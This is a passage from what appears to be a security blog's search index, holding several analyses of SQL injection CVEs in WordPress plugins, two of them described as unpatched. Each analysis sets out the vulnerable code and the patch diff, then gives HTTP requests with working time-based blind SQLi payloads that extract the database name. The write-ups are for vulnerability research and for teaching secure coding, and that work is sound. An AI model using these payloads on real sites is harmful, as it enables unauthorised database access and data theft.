twice due to its usage in two separate SQL calls containing the malicious payload. ","date":"2025-09-29","objectID":"/2025-09-29-cve-2025-48118/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/2025-09-29-cve-2025-48118/"},{"categories":["CVE Analyst"],"content":"Exploit ","date":"2025-09-29","objectID":"/2025-09-29-cve-2025-48118/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/2025-09-29-cve-2025-48118/"},{"categories":["CVE Analyst"],"content":"Detecting SQLi Send a POST request containing an SQLi payload: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=wxp_order_set_shipped\u0026order_id=(SELECT 1 FROM (SELECT SLEEP(5))a) This results in the query: SELECT id as ship_id FROM wp_partial_shipment WHERE order_id=(SELECT 1 FROM (SELECT SLEEP(5))a) Because the query executes twice, the response time doubles. Response time after successful exploitation A subquery in the FROM clause is used because MySQL treats it as a temporary table. The subquery executes once to create the temporary table, and the main query runs afterward. This ensures the SLEEP function runs only once instead of being multiplied across multiple comparisons. For example, using the following payload: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=wxp_order_set_shipped\u0026order_id=(SELECT SLEEP(5)) The response time increases exponentially. Exponential response time increase ","date":"2025-09-29","objectID":"/2025-09-29-cve-2025-48118/:3:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/2025-09-29-cve-2025-48118/"},{"categories":["CVE Analyst"],"content":"Extracting the First Letter of the Database Name The first step in data extraction is confirming at least one character of the database name ‚Äî once retrieved, the rest can be dumped easily. Send a request with the following SQLi payload: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=wxp_order_set_shipped\u0026order_id=(SELECT 1 FROM (SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1))a) Here, SUBSTRING() extracts the first letter of the database name, and IF() triggers SLEEP(5) if it equals 0x77 (‚Äòw‚Äô). Hex encoding (0x77) is used for 'w' because the order_id parameter, being a POST value, is escaped by magic quotes and sanitize_text_field in WordPress. üëâ Based on the delayed response, we confirm that the first character is 'w'. ","date":"2025-09-29","objectID":"/2025-09-29-cve-2025-48118/:3:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/2025-09-29-cve-2025-48118/"},{"categories":["CVE Analyst"],"content":"Conclusion The CVE-2025-48118 vulnerability in the WordPress Woocommerce Partial Shipment plugin (versions before 3.3) originates from directly inserting unsanitized user input into SQL queries, resulting in a SQL Injection vulnerability. No official patch has been released at the time of writing. Key Takeaways: Always validate and sanitize user input. Use $wpdb-\u003eprepare() for database operations in WordPress to prevent SQL Injection. Keep plugins updated and perform regular security audits to avoid being an attack target. ","date":"2025-09-29","objectID":"/2025-09-29-cve-2025-48118/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/2025-09-29-cve-2025-48118/"},{"categories":["CVE Analyst"],"content":"References SQL Injection Cheat Sheet - PortSwigger WordPress Woocommerce Partial Shipment Plugin \u003c= 3.2 vulnerable to SQL Injection ","date":"2025-09-29","objectID":"/2025-09-29-cve-2025-48118/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/2025-09-29-cve-2025-48118/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Torod Plugin.","date":"2025-09-28","objectID":"/2025-09-28-cve-2025-30936/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/2025-09-28-cve-2025-30936/"},{"categories":["CVE Analyst"],"content":" The vulnerability occurs in the Torod plugin for WordPress. This could allow attackers to directly interact with your database, including but not limited to stealing information. CVE ID: CVE-2025-30936 Product: WordPress Torod Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 1.9 Fixed in: \u003c= N/A CVSS severity: High (9.3) Required Privilege: Unauthenticated ","date":"2025-09-28","objectID":"/2025-09-28-cve-2025-30936/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/2025-09-28-cve-2025-30936/"},{"categories":["CVE Analyst"],"content":"Requirements Local WordPress and Debugging Torod: v1.9 ","date":"2025-09-28","objectID":"/2025-09-28-cve-2025-30936/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/2025-09-28-cve-2025-30936/"},{"categories":["CVE Analyst"],"content":"Analysis The core cause is that the application directly inserts data from a POST request into an SQL query without proper input validation or control mechanisms. ","date":"2025-09-28","objectID":"/2025-09-28-cve-2025-30936/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/2025-09-28-cve-2025-30936/"},{"categories":["CVE Analyst"],"content":"Vulnerable Sink This CVE has no patch available, so we cannot use a diff tool to compare the vulnerable and fixed versions. In WordPress, for SQLi to occur, the application must interact with the database through the global variable $wpdb. We can search for this keyword in the plugin directory to locate the sink. Locate the sink in code üëâ The data from $_POST['country_id'] is directly inserted into the SQL query without proper validation. Using sanitize_text_field() only escapes the string, not fully sanitizing it. Therefore, the SQL Injection vulnerability can occur. Source: $_POST['country_id'] Sink: $wpdb-\u003eget_results(\"SELECT * FROM $table_name WHERE country_id = $country_id\") ","date":"2025-09-28","objectID":"/2025-09-28-cve-2025-30936/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/2025-09-28-cve-2025-30936/"},{"categories":["CVE Analyst"],"content":"How it works? The vulnerability lies in the get_regions_and_cities function of the ajaxyk class within the inc/ajaxyk.php file. To determine where it‚Äôs called, we search for the keyword get_regions_and_cities within the plugin directory. Find the get_regions_and_cities function üëâ get_regions_and_cities is registered as a callback for two action hooks via the add_action function in the ajaxyk constructor. wp_ajax_get_regions_and_cities Written in the format wp_ajax_{$action} Requires user authentication wp_ajax_nopriv_get_regions_and_cities Written in the format wp_ajax_nopriv_{$action} Does not require authentication Since this is an unauthenticated vulnerability, we only focus on the wp_ajax_nopriv_get_regions_and_cities hook. Thus, when a POST request is sent to /wp-admin/admin-ajax.php with parameters: action=wp_ajax_nopriv_get_regions_and_cities\u0026country_id=payload_here The get_regions_and_cities callback is triggered. country_id is taken directly from the request and injected into the SQL query. The query executes with the malicious payload. ","date":"2025-09-28","objectID":"/2025-09-28-cve-2025-30936/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/2025-09-28-cve-2025-30936/"},{"categories":["CVE Analyst"],"content":"Exploit ","date":"2025-09-28","objectID":"/2025-09-28-cve-2025-30936/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/2025-09-28-cve-2025-30936/"},{"categories":["CVE Analyst"],"content":"Detecting SQLi Send a POST request containing the SQLi payload: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=get_regions_and_cities\u0026country_id=(SELECT 1 FROM (SELECT SLEEP(5))a) The resulting query becomes: SELECT * FROM wp_torod_regions WHERE country_id = (SELECT 1 FROM (SELECT SLEEP(5))a) Response time result üëâ Based on the response time =\u003e the payload works. Techniques usable when the table is empty: UNION: Since it does not depend on existing data in the table, but requires knowing the number of columns. Subquery: Subquery in WHERE clause: MySQL may optimize and skip the subquery if the result can be determined early. If the table has no data, MySQL might not execute SLEEP(). Subquery in FROM clause: The subquery is treated as a temporary table. MySQL must execute it first to build the temp table before executing the main query. SQL execution order ","date":"2025-09-28","objectID":"/2025-09-28-cve-2025-30936/:3:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/2025-09-28-cve-2025-30936/"},{"categories":["CVE Analyst"],"content":"Get the First Letter of Database Name The prerequisite to dump all data is to retrieve at least one character of the database name. Once that is achieved, the rest can be enumerated. Send a request with the SQLi payload: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=get_regions_and_cities=1\u0026country_id=(SELECT 1 FROM (SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1))a) Here, SUBSTRING() extracts the first character of the database name, and IF() triggers SLEEP(5) if that character is 0x77 (‚Äòw‚Äô). We use the hex encoding 0x77 for w because country_id is taken from a POST request, which is escaped by magic quotes in WordPress and by sanitize_text_field. üëâ Based on response time =\u003e the first character is confirmed to be w. ","date":"2025-09-28","objectID":"/2025-09-28-cve-2025-30936/:3:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/2025-09-28-cve-2025-30936/"},{"categories":["CVE Analyst"],"content":"Conclusion The CVE-2025-30936 vulnerability in the WordPress Torod plugin (version ‚â§ 1.9) stems from directly inserting user input into an SQL query without proper validation, leading to a classic SQL Injection flaw. No official patch has been released for this vulnerability yet. Key takeaways: Always validate and sanitize user input properly. Always use $wpdb-\u003eprepare() when interacting with the database in WordPress to prevent SQL Injection. Keep plugins up-to-date and perform regular security assessments to avoid being targeted. ","date":"2025-09-28","objectID":"/2025-09-28-cve-2025-30936/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/2025-09-28-cve-2025-30936/"},{"categories":["CVE Analyst"],"content":"References SQL Injection Cheat Sheet - PortSwigger WordPress Torod Plugin \u003c= 1.9 is vulnerable to SQL Injection ","date":"2025-09-28","objectID":"/2025-09-28-cve-2025-30936/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/2025-09-28-cve-2025-30936/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress MyStyle Custom Product Designer Plugin.","date":"2025-09-27","objectID":"/2025-09-27-cve-2025-48281/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/2025-09-27-cve-2025-48281/"},{"categories":["CVE Analyst"],"content":" The vulnerability exists in the MyStyle Custom Product Designer WordPress plugin prior to version 3.21.2. This can allow an attacker to interact directly with your database, including but not limited to data exfiltration. CVE ID: CVE-2025-48281 Product: WordPress MyStyle Custom Product Designer Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 3.21.1 CVSS severity: High (9.3) Required Privilege: Unauthenticated ","date":"2025-09-27","objectID":"/2025-09-27-cve-2025-48281/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/2025-09-27-cve-2025-48281/"},{"categories":["CVE Analyst"],"content":"Requirements Local WordPress and Debugging MyStyle Custom Product Designer: v3.21.1 (vulnerable) and v3.21.2 (patched) diff tool: meld or any tool that can compare two versions to see differences Activated WooCommerce plugin: WooCommerce must be active before installing the MyStyle plugin because some functions from WooCommerce are used. ","date":"2025-09-27","objectID":"/2025-09-27-cve-2025-48281/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/2025-09-27-cve-2025-48281/"},{"categories":["CVE Analyst"],"content":"Analysis The root cause is that the application directly injects data from a GET request into an SQL query without proper validation/control. ","date":"2025-09-27","objectID":"/2025-09-27-cve-2025-48281/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/2025-09-27-cve-2025-48281/"},{"categories":["CVE Analyst"],"content":"Patch Diff Use any diff tool to compare the vulnerable and patched versions. A clear difference exists in the file includes/entities/class-mystyle-designmanager.php public static function get_designs( $per_page = 250, $page_number = 1, WP_User $user = null ) { global $wpdb; // Add security WHERE clause. $where = self::get_security_where_clause( 'WHERE', $user ); if ( ! empty( $_GET['orderby'] ) ) { $order = ' ORDER BY ' . sanitize_text_field( wp_unslash( $_GET['orderby'] ) ); $order .= ! empty( $_GET['order'] ) ? ' ' . sanitize_text_field( wp_unslash( $_GET['order'] ) ) : ' ASC'; } else { $order = ' ORDER BY ms_design_id DESC'; } $results = $wpdb-\u003eget_results( $wpdb-\u003eprepare( 'SELECT * ' . \"FROM {$wpdb-\u003eprefix}mystyle_designs \" . $where . $order . ' LIMIT %d OFFSET %d', array( $per_page, ( $page_number - 1 ) * $per_page, ) ), 'OBJECT' ); // other logic } Data from $_GET['orderby'] is injected directly into the SQL query without proper validation. Using only sanitize_text_field() and wp_unslash() only removes or escapes characters and does not guarantee safety. Therefore, SQLi is possible. public static function get_designs( $per_page = 250, $page_number = 1, WP_User $user = null ) { global $wpdb; // Add security WHERE clause. $where = self::get_security_where_clause( 'WHERE', $user ); if ( ! empty( $_GET['orderby'] ) ) { $orderby = sanitize_text_field( wp_unslash( $_GET['orderby'] ) ); $order = ! empty( $_GET['order'] ) ? sanitize_text_field( wp_unslash( $_GET['order'] ) ) : 'ASC'; // Validate order direction to prevent SQL injection. $allowed_orderby = array( 'ms_design_id', 'ms_title', 'ms_access', 'ms_email', 'ms_date_created', 'ms_date_modified', ); $orderby = in_array( strtolower( $orderby ), $allowed_orderby, true ) ? $orderby : 'ms_design_id'; $order = in_array( strtoupper( $order ), array( 'ASC', 'DESC' ), true ) ? $order : 'ASC'; $order = ' ORDER BY ' . $orderby . ' ' . $order; } else { $order = ' ORDER BY ms_design_id DESC'; } $results = $wpdb-\u003eget_results( $wpdb-\u003eprepare( 'SELECT * ' . \"FROM {$wpdb-\u003eprefix}mystyle_designs \" . $where . $order . ' LIMIT %d OFFSET %d', array( $per_page, ( $page_number - 1 ) * $per_page, ) ), 'OBJECT' ); // other logic } The patch implements a whitelist ($allowed_orderby) that explicitly defines allowable columns for ordering. If the orderby value is not in the allowed list, it is replaced with the default 'ms_design_id' ‚Äî preventing injection of malicious payloads. Patch diff ","date":"2025-09-27","objectID":"/2025-09-27-cve-2025-48281/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/2025-09-27-cve-2025-48281/"},{"categories":["CVE Analyst"],"content":"How it works The vulnerability is in the get_designs function of the MyStyle_DesignManager class (file includes/entities/class-mystyle-designmanager.php). To find where it is called, search for get_designs within the plugin folder. üëâ get_designs is called from get_items, init_index_request and some test functions (not relevant). Search get_designs usage Because this is an unauthenticated vulnerability, we must identify which function can be invoked without authentication. get_items() Function get_items is in the MyStyle_Wp_Rest_Api_Design_Controller class (file includes/wprestapi/class-mystyle-wp-rest-api-design-controller.php). Search get_items The code before calling get_designs doesn‚Äôt handle authentication, so we must check the permission callback used by the REST route. get_items is registered as the callback for a REST API route using register_rest_route() in WordPress. public function register_routes() { $version = '2'; $vendor = 'wc-mystyle'; $namespace = $vendor . '/v' . $version; $base = 'designs'; register_rest_route( $namespace, '/' . $base, array( array( 'methods' =\u003e WP_REST_Server::READABLE, // GET 'callback' =\u003e array( $this, 'get_items' ), 'permission_callback' =\u003e array( $this, 'get_items_permissions_check' ), 'args' =\u003e array(), ) ) ) // other logic } However, before the callback is invoked, the get_items_permissions_check function runs ‚Äî we need to know whether an anonymous user can call this API. Search for get_items_permissions_check. Search get_items_permissions_check üëâ get_items_permissions_check calls wc_rest_check_manager_permissions to verify permissions with $object = 'settings'. Because wc_rest_check_manager_permissions is defined in the WooCommerce plugin (not in this plugin), we need to inspect its behavior. Search wc_rest_check_manager_permissions wc_rest_check_manager_permissions is defined in the WooCommerce plugin. The settings mapping leads to manage_woocommerce. It calls current_user_can( 'manage_woocommerce' ) to check user capability =\u003e only admin (or users with manage_woocommerce capability). üëâ Therefore we cannot exploit via get_items =\u003e we should try to exploit via init_index_request. init_index_request() Function init_index_request is in the MyStyle_Design_Profile_Page class (file includes/pages/class-mystyle-design-profile-page.php). Search init_index_request The code prior to calling get_designs doesn‚Äôt involve authentication, so we move on. init_index_request is invoked by the init method in the same class. public function init() { // Check if the current page is /designs if ( ! self::is_current_post() ) { return; } // other logic $design_id = self::get_design_id_from_url(); // Only runs when the following POST variables are present =\u003e not relevant if( isset( $_POST['delete_design_nonce'] ) \u0026\u0026 wp_verify_nonce( sanitize_key( $_POST['delete_design_nonce'] ), 'mystyle_delete_design_nonce' ) ) { $design = MyStyle_DesignManager::get( $design_id, $user, $session ) ; if ( $design ) { // Check if the user is the owner of the design or an admin. if ( current_user_can( 'administrator' ) || MyStyle_DesignManager::is_user_design_owner( $this-\u003euser-\u003eID, $design_id ) ) { // restrict the design access to 2 (deleted). $design-\u003eset_access( 2 ); MyStyle_DesignManager::persist( $design ); $this-\u003edelete_design_success_message = 'Design has been successfully deleted.'; } } } if ( false === $design_id || preg_match( '/page/', $design_id ) ) { $design_profile_page-\u003einit_index_request(); } else { $design_profile_page-\u003einit_design_request( $design_id ); } } For init_index_request to be called, the if condition must be true. We need to know what $design_id is ‚Äî it‚Äôs determined by get_design_id_from_url which is called via self::get_design_id_from_url. public static function get_design_id_from_url() { // Try the query vars ( ex: \u0026design_id=10 ). $design_id = get_query_var( 'design_id' ); if ( preg_match( '/page/', $design_id ) ) { $design_id = false; } elseif ( empty( $design_id ) ) { // ---------- try at /desig","date":"2025-09-27","objectID":"/2025-09-27-cve-2025-48281/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/2025-09-27-cve-2025-48281/"},{"categories":["CVE Analyst"],"content":"Exploit ","date":"2025-09-27","objectID":"/2025-09-27-cve-2025-48281/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/2025-09-27-cve-2025-48281/"},{"categories":["CVE Analyst"],"content":"Detect SQLi Send a GET request containing an SQLi payload. GET /designs/?orderby=(SELECT+SLEEP(5)) HTTP/1.1 Host: localhost ... Cookie: cookie_here The resulting SQL becomes: SELECT * FROM wp_mystyle_designs WHERE ms_access = 0 ORDER BY (SELECT SLEEP(5)) ASC LIMIT 25 OFFSET 0 Time-based SQLi Response üëâ Based on the response time =\u003e the payload is effective. In this case, do not append a comment after SLEEP. Because the developer has an Enter/newline that moves OFFSET to the next line; if you comment it out, the SQL parser may return an error. Debug SQL Error The chain will be split into two queries on different lines causing an error: SELECT * FROM wp_mystyle_designs WHERE ms_access = 0 ORDER BY (SELECT SLEEP(5)) -- ASC LIMIT 25 OFFSET 0 ","date":"2025-09-27","objectID":"/2025-09-27-cve-2025-48281/:3:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/2025-09-27-cve-2025-48281/"},{"categories":["CVE Analyst"],"content":"Get First Letter of Database Name A prerequisite for dumping data is being able to extract a single character of the database name ‚Äî if you can get one character, you can typically dump the rest. Send a request with an SQLi payload: GET /designs/?orderby=IF(SUBSTRING(SCHEMA(),1,1)=0x77,SLEEP(5),1) HTTP/1.1 Host: localhost ... Cookie: cookie_here This uses SUBSTRING() to get the first character of the database name, and IF() returns SLEEP(5) if that character equals 0x77 (‚Äòw‚Äô). Hex encoding w as 0x77 is used because orderby comes from a GET parameter that may be escaped by WordPress magic quotes. üëâ Based on the response time =\u003e the first character is w. ","date":"2025-09-27","objectID":"/2025-09-27-cve-2025-48281/:3:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/2025-09-27-cve-2025-48281/"},{"categories":["CVE Analyst"],"content":"Conclusion The CVE-2025-48281 vulnerability in the WordPress MyStyle Custom Product Designer plugin prior to version 3.21.2 stems from directly inserting user-controlled input into SQL without sufficient validation, leading to SQL Injection. The official patch implements a whitelist which ensures the input is validated and safer. Key takeaways: Strictly validate user input. Always use $wpdb-\u003eprepare() when working with the database in WordPress to avoid SQL Injection. Regularly update plugins and perform security checks to avoid becoming a target. ","date":"2025-09-27","objectID":"/2025-09-27-cve-2025-48281/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/2025-09-27-cve-2025-48281/"},{"categories":["CVE Analyst"],"content":"References SQL Injection cheat sheet - PortSwigger WordPress MyStyle Custom Product Designer Plugin \u003c= 3.21.1 is vulnerable to SQL Injection ","date":"2025-09-27","objectID":"/2025-09-27-cve-2025-48281/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/2025-09-27-cve-2025-48281/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Accessibility Suite Plugin.","date":"2025-09-26","objectID":"/2025-09-26-cve-2025-32650/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/2025-09-26-cve-2025-32650/"},{"categories":["CVE Analyst"],"content":" The vulnerability occurs in the Accessibility Suite plugin for WordPress before version 4.19. This allows an attacker to directly interact with the database, potentially stealing sensitive information. CVE ID: CVE-2025-32650 Product: WordPress Accessibility Suite Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 4.18 CVSS Severity: High (8.5) Required Privilege: Subscriber ","date":"2025-09-26","objectID":"/2025-09-26-cve-2025-32650/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/2025-09-26-cve-2025-32650/"},{"categories":["CVE Analyst"],"content":"Requirements Local WordPress and Debugging Accessibility Suite: v4.18 (vulnerable) and v4.19 (patched) Diff tool: meld or any other comparison tool to spot version differences ","date":"2025-09-26","objectID":"/2025-09-26-cve-2025-32650/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/2025-09-26-cve-2025-32650/"},{"categories":["CVE Analyst"],"content":"Analysis The plugin failed to properly typecast user input. Although it used prepare() to prevent SQLi, the implementation was incorrect, leaving the vulnerability exploitable. ","date":"2025-09-26","objectID":"/2025-09-26-cve-2025-32650/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/2025-09-26-cve-2025-32650/"},{"categories":["CVE Analyst"],"content":"Patch Diff Use any diff tool to compare the vulnerable and patched versions. A key difference appears in includes/classes/Helper.php. static function save_false_positive($scan_id, $issue_id){ // other logic if(! is_admin()) { return ''; } // other logic $list = json_decode( $wpdb-\u003eget_results($wpdb-\u003eprepare(\"SELECT list FROM $table_name WHERE scan_id = $scan_id\"))[0]-\u003elist // phpcs:ignore ); } The patched version passes $scan_id as a parameter to the query instead of directly concatenating it. static function save_false_positive($scan_id, $issue_id){ // other logic if(! is_admin()) { return ''; } // other logic $scan_id = absint($scan_id); // Ensure scan_id is a positive integer if (!$scan_id) { return [\"status\" =\u003e \"failed\", \"msg\" =\u003e \"Invalid scan ID\"]; } // Get list using properly prepared query $query = $wpdb-\u003eprepare( \"SELECT list FROM %i WHERE scan_id = %d\", $table_name, $scan_id ); $result = $wpdb-\u003eget_results($query); } Patch Diff ","date":"2025-09-26","objectID":"/2025-09-26-cve-2025-32650/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/2025-09-26-cve-2025-32650/"},{"categories":["CVE Analyst"],"content":"How it works The vulnerability resides in the static function save_false_positive of class Helper in includes/classes/Helper.php. To locate where it‚Äôs called, search for save_false_positive in the plugin directory. Search Function Call üëâ The save_false_positive function is called as a callback by the action hook wp_ajax_ONLINE_ADAv4/save_false_positive. When a POST request is sent to /wp-admin/admin-ajax.php with action=ONLINE_ADAv4/save_false_positive, the callback is executed. It requires two POST parameters: issue_id and scan_id. If they‚Äôre missing, the app returns: {\"status\":\"failed\",\"msg\":\"Did not receive the scan ID or the issue ID\"} The function checks if the user has admin privileges; if not, it returns an empty string. if(! is_admin()) { return ''; } Then, the parameters are directly concatenated into the vulnerable SQL query. ","date":"2025-09-26","objectID":"/2025-09-26-cve-2025-32650/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/2025-09-26-cve-2025-32650/"},{"categories":["CVE Analyst"],"content":"Exploit ","date":"2025-09-26","objectID":"/2025-09-26-cve-2025-32650/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/2025-09-26-cve-2025-32650/"},{"categories":["CVE Analyst"],"content":"Detecting the SQLi Send a POST request containing an SQLi payload. Since it only requires an authenticated user with access to /wp-admin/, we can use a subscriber role ‚Äî the lowest privilege in WordPress. Higher roles inherit lower privileges, so this confirms the CVE‚Äôs description. POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded; charset=UTF-8 ... Cookie: cookie_here action=ONLINE_ADAv4/save_false_positive\u0026issue_id=1\u0026scan_id=1 UNION SELECT SLEEP(5) The resulting SQL query becomes: SELECT list FROM wp_oada_false_positives WHERE scan_id = 1 UNION SELECT SLEEP(5) Time-based SQLi Response üëâ The delayed response confirms that the SQLi payload works. Alternative techniques for empty tables: UNION ‚Äî works even when the base query returns no rows, but you must find the correct column count. Subquery: In WHERE clause: MySQL may optimize it away if results are predictable. In FROM clause: The subquery executes first to create a temporary table, ensuring the injected query runs. SQL Execution Order Diagram ","date":"2025-09-26","objectID":"/2025-09-26-cve-2025-32650/:3:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/2025-09-26-cve-2025-32650/"},{"categories":["CVE Analyst"],"content":"Extracting the First Letter of the Database Name To fully dump data, we first confirm that SQLi allows reading at least one character from the database name. Use this payload: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded; charset=UTF-8 ... Cookie: cookie_here action=ONLINE_ADAv4/save_false_positive\u0026issue_id=1\u0026scan_id=1 UNION SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1) The query uses SUBSTRING() to extract the first character of the database name. If it equals 'w' (0x77 in hex), it triggers SLEEP(5). Since scan_id is escaped, hex encoding ensures payload integrity. üëâ Based on the delayed response ‚Äî the first character is indeed w. ","date":"2025-09-26","objectID":"/2025-09-26-cve-2025-32650/:3:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/2025-09-26-cve-2025-32650/"},{"categories":["CVE Analyst"],"content":"Conclusion The vulnerability CVE-2025-32650 in the Accessibility Suite WordPress plugin (before version 4.19) stems from improper use of $wpdb-\u003eprepare(), leading to a SQL Injection. The official patch correctly uses $wpdb-\u003eprepare(), ensuring safe handling of user input. Key takeaways: Always use $wpdb-\u003eprepare() correctly when interacting with the WordPress database. Keep plugins updated and perform regular security audits to prevent exploitation. ","date":"2025-09-26","objectID":"/2025-09-26-cve-2025-32650/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/2025-09-26-cve-2025-32650/"},{"categories":["CVE Analyst"],"content":"References SQL Injection Cheat Sheet ‚Äì PortSwigger WordPress Accessibility Suite Plugin \u003c= 4.18 is vulnerable to SQL Injection ","date":"2025-09-26","objectID":"/2025-09-26-cve-2025-32650/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/2025-09-26-cve-2025-32650/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Mail Mint Plugin.","date":"2025-09-25","objectID":"/2025-09-25-cve-2025-58604/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/2025-09-25-cve-2025-58604/"},{"categories":["CVE Analyst"],"content":" The vulnerability occurs in the Mail Mint plugin for WordPress prior to version 1.18.6. This flaw allows attackers to directly interact with the database ‚Äî potentially leading to information disclosure or data theft. CVE ID: CVE-2025-58604 Product: WordPress Mail Mint Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 1.18.5 CVSS Severity: Low (7.6) Required Privilege: Administrator ","date":"2025-09-25","objectID":"/2025-09-25-cve-2025-58604/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/2025-09-25-cve-2025-58604/"},{"categories":["CVE Analyst"],"content":"Requirements Local WordPress and Debugging Mail Mint: v1.18.5 (vulnerable) and v1.18.6 (patched) Diff tool: meld or any comparison tool to visualize the code difference between versions ","date":"2025-09-25","objectID":"/2025-09-25-cve-2025-58604/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/2025-09-25-cve-2025-58604/"},{"categories":["CVE Analyst"],"content":"Analysis The vulnerable function directly inserts user input into an SQL query without using proper sanitization or query preparation, leading to an SQL Injection vulnerability. ","date":"2025-09-25","objectID":"/2025-09-25-cve-2025-58604/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/2025-09-25-cve-2025-58604/"},{"categories":["CVE Analyst"],"content":"Patch Diff Use any diff tool to compare the vulnerable and patched versions. There is a clear difference in the file /app/Utilities/Helper/Import.php. public static function get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) { // other logic global $wpdb; $total_query = \"SELECT COUNT(DISTINCT user_id) as total FROM {$wpdb-\u003eprefix}usermeta WHERE meta_key IN ('\" . implode(\"', '\", $keys) . \"')\"; $total = $wpdb-\u003eget_var($total_query); //phpcs:ignore // Final query to retrieve user IDs with limit and offset. $final_query = \"SELECT user_id FROM {$wpdb-\u003eprefix}usermeta WHERE meta_key IN ('\" . implode(\"', '\", $keys) . \"') GROUP BY user_id LIMIT $number OFFSET $offset\"; $users = $wpdb-\u003eget_results($final_query, ARRAY_A); //phpcs:ignore // other logic } The patch replaces direct string concatenation with the safer $wpdb-\u003eprepare() method. public static function get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) { // other logic global $wpdb; // Total query (safe with prepare) $total_query = $wpdb-\u003eprepare( \"SELECT COUNT(DISTINCT user_id) as total FROM 